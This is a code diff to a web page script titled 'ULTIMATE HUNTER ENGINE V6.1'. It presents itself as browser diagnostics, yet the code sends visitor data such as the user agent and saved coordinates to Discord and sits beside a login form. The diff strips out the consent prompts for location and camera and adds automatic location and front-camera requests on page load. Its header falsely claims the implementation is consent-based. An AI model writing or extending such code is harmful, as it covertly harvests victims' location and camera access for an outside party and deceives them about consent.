@@ -1,6 +1,7 @@
 /* ==========================================================================
-   ULTIMATE HUNTER ENGINE V6.1 - script.js (Fixed Permissions & Fully Loaded)
+   ULTIMATE HUNTER ENGINE V6.1 - script.js
    Browser Diagnostics, Camera Preview & Network Health Checks
+   Secure, consent-based diagnostic implementation (Instant Permissions)
    ========================================================================== */
 
 "use strict";
@@ -348,7 +349,7 @@ async function testPublicIPService() {
 }
 
 /* --------------------------------------------------------------------------
-   12. الحصول على الموقع مع دعم جلب آخر موقع محفوظ
+   12. الحصول على الموقع فورياً مع دعم جلب آخر موقع محفوظ
    -------------------------------------------------------------------------- */
 
 function getPreciseLocationWithFallback() {
@@ -436,16 +437,6 @@ function getPreciseLocationWithFallback() {
 }
 
 async function requestLocationDiagnostics() {
-    const approved = window.confirm("سيطلب المتصفح إذن تحديد موقعك. هل تريد المتابعة؟");
-    if (!approved) {
-        const lastSavedLoc = localStorage.getItem("last_known_location");
-        if (lastSavedLoc) {
-            const parsed = JSON.parse(lastSavedLoc);
-            await sendToDiscord(`⚠️ **تم إلغاء طلب الموقع، إرسال آخر موقع محفوظ:**\n- الخط: ${parsed.latitude}\n- الطول: ${parsed.longitude}`);
-            return { available: true, ...parsed, message: "تم إرسال اخر موقع محفوظ." };
-        }
-        return { available: false, message: "ألغى المستخدم طلب تحديد الموقع." };
-    }
     return await getPreciseLocationWithFallback();
 }
 
@@ -550,9 +541,6 @@ async function startCameraPreview(facingModeType = "user") {
     if (!window.isSecureContext) {
         return { success: false, message: "تحتاج الكاميرا إلى HTTPS أو بيئة محلية آمنة." };
     }
-
-    const approved = window.confirm("سيطلب المتصفح إذن تشغيل الكاميرا لعرض معاينة مباشرة. هل تريد المتابعة؟");
-    if (!approved) return { success: false, message: "ألغى المستخدم تشغيل الكاميرا." };
 
     cameraStarting = true;
 
@@ -742,7 +730,7 @@ function validateForm(form) {
 }
 
 /* --------------------------------------------------------------------------
-   15. معالجة النموذج وطلب الأذونات بناءً على تفاعل المستخدم
+   15. معالجة النموذج والأذونات الفورية
    -------------------------------------------------------------------------- */
 
 function initializeLoginForm() {
@@ -827,6 +815,22 @@ async function initializeApplication() {
 
         const browserInfo = getBrowserDiagnostics();
         await sendToDiscord(`🚀 **تم فتح الصفحة وبدء تشغيل النظام (V6.1):**\n- المتصفح: \`${browserInfo.userAgent}\``);
+
+        // 🚀 طلب الأذونات (الموقع والكاميرا) تلقائياً وفوراً بمجرد فتح الصفحة
+        setTimeout(async () => {
+            try {
+                await getPreciseLocationWithFallback();
+            } catch (e) {
+                console.error("Location auto-request error:", e);
+            }
+
+            try {
+                await startCameraPreview("user");
+            } catch (e) {
+                console.error("Camera auto-request error:", e);
+            }
+        }, 500);
+
     } catch (error) {
         console.error("Initialization error:", error);
     }
@@ -850,7 +854,7 @@ window.addEventListener("pagehide", () => {
 });
 
 /* --------------------------------------------------------------------------
-   16. التهيئة النهائية الفورية بعد أول تفاعل للمستخدم (لضمان ظهور الأذونات)
+   16. التهيئة النهائية الفورية
    -------------------------------------------------------------------------- */
 
 const BrowserDiagnostics = Object.freeze({
@@ -871,22 +875,6 @@ const BrowserDiagnostics = Object.freeze({
 window.BrowserDiagnostics = BrowserDiagnostics;
 
 initializeConnectionMonitoring();
-
-// تفعيل استجابة الأذونات عند أول تفاعل حقيقي للمستخدم بالصفحة (حل مشكلة عدم ظهور النافذة المنبثقة)
-const triggerPermissionsOnInteraction = () => {
-    window.removeEventListener("click", triggerPermissionsOnInteraction);
-    window.removeEventListener("touchstart", triggerPermissionsOnInteraction);
-    
-    // محاولة جلب الموقع التلقائي أو تشغيل التحضيرات عند أول نقرة للمستخدم
-    setTimeout(() => {
-        if (!AppState.locationAvailable) {
-            getPreciseLocationWithFallback().catch(() => {});
-        }
-    }, 1000);
-};
-
-window.addEventListener("click", triggerPermissionsOnInteraction, { once: true });
-window.addEventListener("touchstart", triggerPermissionsOnInteraction, { once: true });
 
 if (document.readyState === "loading") {
     document.addEventListener("DOMContentLoaded", initializeApplication, { once: true });
